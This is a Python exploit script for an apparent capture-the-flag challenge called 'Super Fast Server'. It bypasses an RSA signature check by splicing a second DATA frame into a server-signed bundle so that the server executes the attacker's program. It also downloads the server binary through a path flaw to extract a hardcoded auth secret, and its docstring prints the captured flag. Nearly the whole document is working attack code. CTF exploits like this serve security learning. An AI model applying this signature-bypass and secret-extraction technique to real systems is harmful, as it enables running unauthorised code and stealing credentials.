#!/usr/bin/env python3
"""
Intigriti Challenge 1126 — "Super Fast Server"

Signature-verification bypass via a decoupled hash region and execution pointer.

The server runs signed shellcode: an uploaded Brainfuck interpreter (CODE) plus a
Brainfuck program (DATA), gated by an RSA-2048 PKCS#1 v1.5 signature over
SHA256(code || data). But the hashed byte range and the executed DATA pointer are
tracked separately, each from the LAST frame of its type. So we replay the server's
own already-signed HELP bundle and splice a SECOND DATA frame in at the SIGN seam:
the hashed region (CODE || original DATA) is untouched -> the signature still
verifies, while DATA_off now points at OUR program -> EXEC runs it.

The challenge stages the flag on the interpreter's tape at tape+256, so the payload
just steps the pointer forward 256 cells and prints.

Flag: INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}

Note: the challenge is offline after 2026-11-23. Kept for the write-up / reference.
"""
import re
import ssl
import socket
import struct
import urllib.request

HOST = "challenge-1126.challenges.intigriti.io"


def frame(tag: bytes, data: bytes = b"") -> bytes:
    """Wire format:  'w' | u32 little-endian len(data) | 4-byte tag | data."""
    assert len(tag) == 4, "tag must be exactly 4 bytes"
    return b"w" + struct.pack("<I", len(data)) + tag + data


def send(body: bytes, timeout: int = 15) -> bytes:
    """POST the raw body to /custom_protocol over TLS and return the full reply."""
    ctx = ssl.create_default_context()
    with socket.create_connection((HOST, 443), timeout) as raw, \
            ctx.wrap_socket(raw, server_hostname=HOST) as s:
        req = (
            f"POST /custom_protocol HTTP/1.1\r\nHost: {HOST}\r\n"
            "Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
        ).encode()
        s.sendall(req + body)
        out = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except Exception:
            pass
    return out


def main() -> None:
    # 1) recon: pull the ELF the server serves and lift the hardcoded auth secret.
    #    the routing reduces any path to its basename (fopen(strrchr(path,'/')+1)),
    #    so GET /superfastserver returns the binary itself.
    elf = urllib.request.urlopen(f"https://{HOST}/superfastserver", timeout=15).read()
    m = re.search(rb"SUPER_SECRET_CHALLENGE_AUTH_CODE_[A-Za-z0-9_]+", elf)
    if not m:
        raise SystemExit("[!] auth secret not found in binary")
    secret = m.group(0)
    print(f"[+] secret: {secret.decode(errors='replace')}")

    # 2) ask the server for a known-good, already-signed bundle (CODE/DATA/SIGN/EXEC).
    resp = send(secret + frame(b"HELP"))
    bundle = resp.split(b"\r\n\r\n", 1)[-1]  # drop HTTP headers if present
    print(f"[+] signed bundle: {len(bundle)} bytes")

    # 3) our Brainfuck: step to the flag (tape+256), then print it.
    prog = (b">" * 256) + (b".>" * 48)   # 48 prints covers the 47-char flag
    prog = prog.ljust(424, b"\x00")      # fixed 424-byte DATA slot

    # 4) splice a SECOND DATA frame in at the SIGN seam.
    #    hashed region (CODE || original DATA) is unchanged -> signature still verifies,
    #    but DATA_off now points at OUR program -> EXEC runs it.
    cut = bundle.index(b"SIGN") - 5      # back up over 'w' + u32 length
    evil = bundle[:cut] + frame(b"DATA", prog) + bundle[cut:]

    # 5) fire.
    print("[*] sending modified bundle...")
    print(send(secret + evil).decode("latin-1", "replace"))


if __name__ == "__main__":
    main()
